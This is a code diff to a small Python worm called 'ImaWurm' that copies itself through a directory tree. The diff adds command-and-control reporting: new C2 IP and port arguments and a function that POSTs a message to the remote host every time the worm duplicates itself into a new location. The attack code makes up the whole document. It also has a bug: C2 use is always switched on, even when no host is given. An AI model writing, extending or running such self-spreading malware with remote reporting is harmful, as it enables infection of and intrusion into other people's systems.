@@ -3,10 +3,11 @@ import logging
 import os
 import shutil
 import uuid
+from urllib import request, parse
 
 
 class Worm:
-    def __init__(self, verbose=False):
+    def __init__(self, c2ip=None, c2port=None, verbose=False):
         logging.basicConfig(
             format="[%(asctime)s] [%(levelname)s]: %(message)s",
             level=logging.INFO,
@@ -21,9 +22,27 @@ class Worm:
         logging.debug(f"Wurm path = {self.path}")
         logging.debug(f"Wurm name = {self.name}")
 
+        if bool(c2ip) ^ bool(c2port):
+            logging.error("If C2 should be used you need to specify both IP and port")
+            raise Exception("C2 option not properly used")
+
+        self.c2ip = c2ip
+        self.c2port = c2port
+        self.use_c2 = True
+
+        logging.debug(f"Use C2 = {self.use_c2}")
+        if self.use_c2:
+            logging.debug(f"C2 IP = {self.c2ip}")
+            logging.debug(f"C2 Port = {self.c2port}")
+
     @staticmethod
     def set_loglevel_debug():
         logging.getLogger().setLevel(logging.DEBUG)
+
+    def contact_c2(self, msg):
+        data = parse.urlencode({"msg": msg}).encode()
+        req = request.Request(f"https://{self.c2ip}:{self.c2port}", data=data)
+        request.urlopen(req)
 
     def duplicate(self, to):
         shutil.copy(self.path, to)
@@ -80,16 +99,19 @@ class Worm:
             logging.debug(f"path = {path_}, dir = {dir_}, file = {file_}")
             if self.name not in file_:
                 self.duplicate(path_)
+                self.contact_c2(f"Duplicated to {path_}")
 
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(prog="ImaWurm", description="Simple Python Worm")
     parser.add_argument("-b", "--base-dir")
     parser.add_argument("-d", "--depth")
+    parser.add_argument("-c2ip")
+    parser.add_argument("-c2port")
     parser.add_argument("-t", "--test", action="store_true")
     parser.add_argument("-v", "--verbose", action="store_true")
     args = parser.parse_args()
-    wurm = Worm(args.verbose)
+    wurm = Worm(args.c2ip, args.c2port, args.verbose)
     try:
         wurm.proliferate(
             base_dir=args.base_dir,
